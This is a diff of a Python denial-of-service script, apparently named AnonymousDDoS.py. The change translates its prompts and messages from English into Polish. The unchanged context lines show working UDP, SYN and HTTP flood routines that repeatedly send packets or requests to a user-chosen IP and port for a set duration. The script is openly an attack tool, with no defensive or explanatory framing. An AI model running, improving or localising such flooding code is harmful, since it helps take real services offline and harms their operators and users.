@@ -11,18 +11,18 @@ os.system("figlet AnonymousDDoS.py")
 
 
 # Prompt for target IP and port
-ip = input("Enter the target IP: ")
+ip = input("Wprowadź docelowy adres IP: ")
 try:
-    port = int(input("Enter the target port: "))
+    port = int(input("Wprowadź docelowy port: "))
 except ValueError:
-    print("Invalid port. Exiting...")
+    print("Nieprawidłowy port. Wychodzenie...")
     sys.exit()
 
 # Prompt for attack duration
 try:
-    dur = int(input("Enter the duration of the attack in seconds: "))
+    dur = int(input("Wprowadź czas trwania ataku w sekundach: "))
 except ValueError:
-    print("Invalid duration. Exiting...")
+    print("Nieprawidłowy czas trwania. Wychodzenie...")
     sys.exit()
 
 # Function to perform the UDP Flood attack
@@ -46,7 +46,7 @@ def udp_flood(ip, port, message, dur):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"Sent packet {packet_count}")
+            print(f"Wysłany pakiet {packet_count}")
         except socket.error:
             # If the socket is not able to send the packet, break the loop
             break
@@ -72,12 +72,12 @@ def syn_flood(ip, port, duration):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
             sent += 1
-            print(f"SYN Packets sent: {sent} to target: {ip}")
+            print(f"SYN Pakiety wysłane: {sent} Do celu: {ip}")
             sock.close()
         except OSError:
             pass
         except KeyboardInterrupt:
-            print("\n[*] Attack stopped.")
+            print("\n[*] Atak ustał.")
             sys.exit()
         finally:
             sock.close()  # Make sure to close the socket in all cases 
@@ -103,28 +103,28 @@ def http_flood(ip, port, duration):
             sock.connect((ip, port))
             sock.sendall(http_request)
             sent += 1
-            print(f"HTTP Packets sent: {sent} to target: {ip}")
+            print(f"HTTP Pakiety wysłane: {sent} Do celu: {ip}")
         except KeyboardInterrupt:
-            print("\n[-] Attack stopped by user")
+            print("\n[-] Zatrzymanie ataku przez użytkownika")
             break
     sock.close()
 
 
 # Prompt for the type of attack
 attack_type = input(colored(
-    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
+    "Wprowadź typ ataku (wybierz numer) (1.UDP/2.HTTP/3.SYN): ", "green"))
 
 if attack_type == "1":
     message = b"Sending 1337 packets baby"
-    print(colored("UDP attack selected", "red"))
+    print(colored("UDP wybrany atak", "red"))
     udp_flood(ip, port, message, dur)
-    print(colored("UDP attack completed", "red"))
+    print(colored("UDP atak zakończony", "red"))
 elif attack_type == "3":
-    print(colored("SYN attack selected", "red"))
+    print(colored("SYN wybrany atak", "red"))
     syn_flood(ip, port, dur)
 elif attack_type == "2":
-    print(colored("HTTP attack selected", "red"))
+    print(colored("HTTP wybrany atak", "red"))
     http_flood(ip, port, dur)
 else:
-    print(colored("Invalid attack type. Exiting...", "green"))
+    print(colored("Nieprawidłowy typ ataku. Wychodzenie...", "green"))
     sys.exit()
